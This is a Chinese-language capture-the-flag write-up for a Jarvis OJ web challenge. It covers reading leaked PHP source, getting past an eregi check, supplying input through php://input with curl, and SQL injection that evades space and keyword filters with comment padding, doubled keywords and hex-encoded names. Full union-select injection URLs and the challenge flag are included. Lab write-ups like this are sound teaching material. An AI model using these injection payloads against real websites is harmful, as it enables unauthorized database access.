## 描述

连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。

题目入口：http://web.jarvisoj.com:32780/

## 题解

跳转到了 http://web.jarvisoj.com:32780/index.php?id=1

```html
<!--index.phps-->work harder!harder!harder!
```

没有有效的信息，只有那个 `?id=1` 比较显眼。

尝试 sql 注入，没卵用。

发现之前那个 response 里的注释是 `index.phps`，尝试了一下居然打开了！得到

```php
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}
?>
```

查了下 `eregi` 和 `substr` 的用法，可以知道 `eregi("111".substr($b,0,1),"1114")` 这句话是将 `111` 与 `b` 的第一个字符拼起来，然后作为正则表达式去匹配 `1114`，匹配成功则为 true。（但是注意 `eregi` 在 PHP 7 就移除了，只是从 response header 来看服务器的 PHP 还是 5.X，所以能用）

那么这就很好办了，构造 `b=*11111` 就好了。

接下来思考如何让 `id=0`，思考一下 `id=0x0` 是不是就行了？哈哈哈还真的行。

现在来看 `data` 得如何得到 `1112 is a nice lab!` 这个字符串。

先尝试 http://web.jarvisoj.com:32780/index.php?id=0x0&b=*11111&a=g.g 得到了 `HIAHIAHIA` 的 response，与 `Hahahahahaha` 不符，猜测 `index.phps` 一定是一个由程序员偷懒而重命名得到的废弃文件哈哈哈，与 `index.php` 还是有差别的。

查询一下 `file_get_contents` 这个函数，发现这玩意是能获取 URL 的！！！但是如果没得自己的服务器支持挺难找的。。

再搜了一下发现了 `php://input` 这个玩意！！所以构造 `a=php://input/`，然后再 `POST` 一下 `1112 is a nice lab!` 就好！

`curl "http://web.jarvisoj.com:32780/index.php?id=0x0&b=*11111&a=php://input" -d "1112 is a nice lab!"`

于是得到 `<!--index.phps-->﻿Come ON!!! {/^HT2mCpcvOLf}`

看起来像地址，所以访问 http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf

跳转到了 http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1

然后发现没多余信息了，头大。再尝试注入 `id=1 and 0`，发现得到了新东西！

```
you bad boy/girl!
```

看来有希望了，搞事情开始。然后发现注入全是得到上面的东西。。。。。。。。失望。

开始试试 `id=0`，没用。`id=2`，返回了新东西

```
SELECT * FROM content WHERE id=2
```

没卵用。。发现只要 `id` 里有空格就不行。。看下题解吧。

woc，空格能花式绕过，见 http://drops.xmd5.com/static/drops/tips-7299.html

> 空格替换：%20, %09, %0a, %0b, %0c, %0d, %a0  
  也可以插入括号，前缀，操作符，引号  
  'or+(1)sounds/**/like"1"--%a0-

在这里可以用 `/*1*/`。

但是还是好多关键字不能用。。查资料发现。。好多姿势。。。 https://blog.csdn.net/wy_97/article/details/78085664

根据简易的过滤规则（比如只替换关键字为空），我们便能双写关键字达到目的。。比如这样

`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=2/*1*/seleselectct`

那么我们根据 `SELECT * FROM content WHERE id=2` 知道表名是 `content`，现在来找列名。

`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=2/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74`

注意表名我们用十六进制绕过了。得到

`id,context,title`

所以再找一下列里的信息就好了

`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=2/*1*/ununionion/*1*/selselectect/*1*/1,2,context/*1*/frfromom/*1*/content`

得到答案

## 答案

PCTF{Fin4lly_U_got_i7_C0ngRatulation5}